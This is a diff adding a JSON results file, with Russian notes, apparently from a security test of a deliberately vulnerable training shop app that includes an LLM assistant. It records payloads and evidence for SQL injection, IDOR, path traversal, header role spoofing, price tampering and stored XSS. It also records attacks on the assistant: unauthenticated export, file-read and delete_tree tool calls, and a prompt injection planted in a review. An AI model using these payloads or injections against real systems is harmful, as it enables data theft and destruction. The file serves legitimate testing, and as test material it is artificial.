@@ -1,0 +1,116 @@
+{
+  "attacks": [
+    {
+      "name": "unauth_profile_idor",
+      "vector": "GET /profile?id=2 без токена",
+      "status": 200,
+      "evidence": "[{\"id\": 2, \"name\": \"TEST_BOB\", \"email\": \"bob@example.invalid\", \"address\": \"TEST_ADDRESS_B\"}]",
+      "note": "чужой профиль отдан без аутентификации"
+    },
+    {
+      "name": "sqli_profile",
+      "vector": "GET /profile?id=0 OR 1=1",
+      "status": 200,
+      "evidence": "[{\"id\": 1, \"name\": \"TEST_ALICE\", \"email\": \"alice@example.invalid\", \"address\": \"TEST_ADDRESS_A\"}, {\"id\": 2, \"name\": \"TEST_BOB\", \"email\": \"bob@example.invalid\", \"address\": \"TEST_ADDRESS_B\"}]",
+      "note": "SQL-инъекция возвращает все профили"
+    },
+    {
+      "name": "sqli_search",
+      "vector": "GET /search?q=' OR '1'='1",
+      "status": 200,
+      "evidence": "[{\"id\": 1, \"name\": \"TEST_ALICE\", \"email\": \"alice@example.invalid\", \"address\": \"TEST_ADDRESS_A\"}, {\"id\": 2, \"name\": \"TEST_BOB\", \"email\": \"bob@example.invalid\", \"address\": \"TEST_ADDRESS_B\"}]",
+      "note": "SQL-инъекция в поиске и отсутствие авторизации"
+    },
+    {
+      "name": "spoofed_role_export",
+      "vector": "GET /admin/export с X-Role: staff",
+      "status": 200,
+      "evidence": "[{\"id\": 1, \"name\": \"TEST_ALICE\", \"email\": \"alice@example.invalid\", \"address\": \"TEST_ADDRESS_A\"}, {\"id\": 2, \"name\": \"TEST_BOB\", \"email\": \"bob@example.invalid\", \"address\": \"TEST_ADDRESS_B\"}]",
+      "note": "роль берётся из клиентского заголовка"
+    },
+    {
+      "name": "cross_user_receipt",
+      "vector": "GET /files?user=bob&path=receipt.txt",
+      "status": 200,
+      "evidence": "{\"content\": \"TEST_BOB receipt: lamp, 1500 RUB\"}",
+      "note": "клиент читает чек другого клиента"
+    },
+    {
+      "name": "private_note_traversal",
+      "vector": "GET /files с path=../../private/operator-note.txt",
+      "status": 200,
+      "evidence": "{\"content\": \"TEST_ONLY_OPERATOR_SECRET\"}",
+      "note": "выход из каталога пользователя к служебной заметке"
+    },
+    {
+      "name": "price_tampering",
+      "vector": "POST /orders {product: chair, price: 1}",
+      "status": 201,
+      "evidence": "{\"id\": 3, \"owner\": 1, \"product\": \"chair\", \"price\": 1}",
+      "note": "клиент назначает цену вместо каталога"
+    },
+    {
+      "name": "orders_leak",
+      "vector": "GET /orders без токена",
+      "status": 200,
+      "evidence": "[{\"id\": 1, \"owner\": 1, \"product\": \"chair\", \"price\": 5000.0}, {\"id\": 2, \"owner\": 2, \"product\": \"lamp\", \"price\": 1500.0}, {\"id\": 3, \"owner\": 1, \"product\": \"chair\", \"price\": 1.0}]",
+      "note": "заказы всех клиентов доступны без аутентификации"
+    },
+    {
+      "name": "stored_xss",
+      "vector": "POST /reviews + GET /reviews/view",
+      "status": 200,
+      "evidence": "<html><body><p><script>alert(1)</script></p></body></html>",
+      "note": "отзыв вставляется в HTML без экранирования"
+    },
+    {
+      "name": "assistant_context_idor",
+      "vector": "GET /assistant/context?order_id=2 без токена",
+      "status": 200,
+      "evidence": "{\"prompt\": \"Ты помощник магазина. Прочитай заказ и отзывы. Верни JSON с полями tool и arguments.\\nИнструменты: read_file(path), export_profiles(), delete_tree(path).\\nПомоги пользователю обработать заказ.\\nЗаказ: [{\\\"id\\\": 2, \\\"owner\\\": 2, ",
+      "note": "контекст помощника собирается по чужому заказу"
+    },
+    {
+      "name": "assistant_context_sqli",
+      "vector": "GET /assistant/context?order_id=1 OR 1=1",
+      "status": 200,
+      "evidence": "{\"prompt\": \"Ты помощник магазина. Прочитай заказ и отзывы. Верни JSON с полями tool и arguments.\\nИнструменты: read_file(path), export_profiles(), delete_tree(path).\\nПомоги пользователю обработать заказ.\\nЗаказ: [{\\\"id\\\": 1, \\\"owner\\\": 1, ",
+      "note": "SQL-инъекция при сборке контекста"
+    },
+    {
+      "name": "debug_logs_leak",
+      "vector": "GET /debug/logs",
+      "status": 200,
+      "evidence": "[{\"method\": \"POST\", \"target\": \"/login\", \"body\": {\"username\": \"alice\", \"password\": \"learn-alice\"}, \"headers\": {\"Accept-Encoding\": \"identity\", \"Content-Length\": \"48\", \"Host\": \"127.0.0.1:11261\", \"User-Agent\": \"Python-urllib/3.11\", \"Content-Typ",
+      "note": "журнал раскрывает пароль и токены"
+    },
+    {
+      "name": "assistant_export_as_customer",
+      "vector": "POST /assistant/execute export_profiles от клиента",
+      "status": 200,
+      "evidence": "[{\"id\": 1, \"name\": \"TEST_ALICE\", \"email\": \"alice@example.invalid\", \"address\": \"TEST_ADDRESS_A\"}, {\"id\": 2, \"name\": \"TEST_BOB\", \"email\": \"bob@example.invalid\", \"address\": \"TEST_ADDRESS_B\"}]",
+      "note": "исполнитель доверяет выбору инструмента и не проверяет роль"
+    },
+    {
+      "name": "assistant_read_private",
+      "vector": "POST /assistant/execute read_file без токена",
+      "status": 200,
+      "evidence": "{\"content\": \"TEST_ONLY_OPERATOR_SECRET\"}",
+      "note": "инструмент читает служебную заметку и не требует сессии"
+    },
+    {
+      "name": "prompt_injection_reaches_context",
+      "vector": "Отзыв с инструкцией попадает в контекст LLM",
+      "status": 200,
+      "evidence": "{\"contains_injection\": true, \"prompt_excerpt\": \"Ты помощник магазина. Прочитай заказ и отзывы. Верни JSON с полями tool и arguments.\\nИнструменты: read_file(path), export_profiles(), delete_tree(path).\\nПомоги пользователю обработать заказ.",
+      "note": "недоверенный отзыв без разделения попадает в prompt"
+    },
+    {
+      "name": "assistant_delete_tree",
+      "vector": "POST /assistant/execute delete_tree без токена",
+      "status": 200,
+      "evidence": "{\"deleted\": \".\"}",
+      "note": "корень стенда существует после удаления: False"
+    }
+  ]
+}
